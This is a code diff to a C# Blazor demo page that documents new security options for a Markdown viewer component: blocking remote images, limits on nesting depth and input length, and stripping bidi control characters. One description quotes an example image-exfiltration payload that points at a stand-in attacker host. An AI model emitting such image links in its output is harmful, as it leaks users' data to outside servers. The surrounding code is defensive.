@@ -24,6 +24,46 @@ public partial class BitMarkdownViewerDemo
            LinkType = LinkType.Link,
            Href = "#markdown-viewer-pipeline",
         },
+        new()
+        {
+           Name = "ImageRendering",
+           Type = "BitMarkdownViewerImageRendering",
+           DefaultValue = "BitMarkdownViewerImageRendering.SameOrigin",
+           Description = @"Controls whether remote images are allowed to load, guarding against silent data-exfiltration
+                           via auto-fetched image URLs (for example ![x](https://attacker.com/leak?data=SECRET)).
+                           Defaults to the safe SameOrigin policy; set it to All to load every remote image when the
+                           source is fully trusted, or None for the strictest policy.",
+           LinkType = LinkType.Link,
+           Href = "#markdown-viewer-image-rendering-enum",
+        },
+        new()
+        {
+           Name = "MaxNestingDepth",
+           Type = "int",
+           DefaultValue = "100",
+           Description = @"The maximum block/inline nesting depth allowed while parsing. Content nested deeper than this is rendered
+                           as plain text instead of being parsed further. An always-on safeguard against denial-of-service via
+                           pathologically nested input (e.g. thousands of nested blockquotes) that would otherwise overflow the
+                           stack. Values <= 0 fall back to the default. Legitimate documents never approach this limit.",
+        },
+        new()
+        {
+           Name = "MaxLength",
+           Type = "int",
+           DefaultValue = "0",
+           Description = @"When greater than zero, the Markdown source is truncated to this many characters before parsing,
+                           bounding the work done on untrusted input. Defaults to 0 (no limit).",
+        },
+        new()
+        {
+           Name = "StripBidiControlCharacters",
+           Type = "bool",
+           DefaultValue = "false",
+           Description = @"When true, Unicode bidirectional control characters are stripped from the source before parsing,
+                           neutralizing 'Trojan Source' (CVE-2021-42574) spoofing where text is made to display in a different
+                           order than it is encoded. Recommended for untrusted or AI-generated Markdown. Zero-width joiners used
+                           by emoji and complex scripts are never removed.",
+        },
     ];
 
     private readonly List<ComponentSubClass> componentSubClasses =
@@ -132,6 +172,37 @@ public partial class BitMarkdownViewerDemo
                     Type = "void WriteNode(RenderTreeBuilder builder, BitMarkdownViewerMarkdownNode node)",
                     DefaultValue = "",
                     Description = "Renders a single node using the matching renderer (last registered wins).",
+                },
+            ]
+        },
+    ];
+
+    private readonly List<ComponentSubEnum> componentSubEnums =
+    [
+        new()
+        {
+            Id = "markdown-viewer-image-rendering-enum",
+            Name = "BitMarkdownViewerImageRendering",
+            Description = "Controls how the BitMarkdownViewer handles image sources, primarily as a defense against data-exfiltration attacks. A remote image is fetched automatically by the browser the moment it is rendered, silently leaking whatever an attacker encodes into the URL.",
+            Items =
+            [
+                new()
+                {
+                    Name = "All",
+                    Description = "All images are rendered and loaded automatically, including remote ones. Suitable only when the Markdown source is fully trusted.",
+                    Value = "0",
+                },
+                new()
+                {
+                    Name = "SameOrigin",
+                    Description = "Only same-origin images (relative paths, anchors and same-document references) are loaded. Remote images (http:, https: and protocol-relative //) are blocked. The recommended mode for untrusted or AI-generated Markdown.",
+                    Value = "1",
+                },
+                new()
+                {
+                    Name = "None",
+                    Description = "No image is allowed to load; every image source is stripped and only the alt text remains. The strictest option.",
+                    Value = "2",
                 },
             ]
         },
@@ -340,7 +411,11 @@ Supports ~~strikethrough~~ and bare links like https://bitplatform.dev
     <div class=""mdv-split"">
         <textarea class=""mdv-editor"" spellcheck=""false"" aria-label=""Markdown editor"" @bind=""playgroundMarkdown"" @bind:event=""oninput""></textarea>
         <div class=""mdv-preview"">
-            <BitMarkdownViewer Markdown=""@playgroundMarkdown"" Pipeline=""@playgroundPipeline"" />
+            <BitMarkdownViewer Markdown=""@playgroundMarkdown""
+                               Pipeline=""@playgroundPipeline""
+                               ImageRendering=""BitMarkdownViewerImageRendering.SameOrigin""
+                               StripBidiControlCharacters=""true""
+                               MaxLength=""100000"" />
         </div>
     </div>
 </div>";
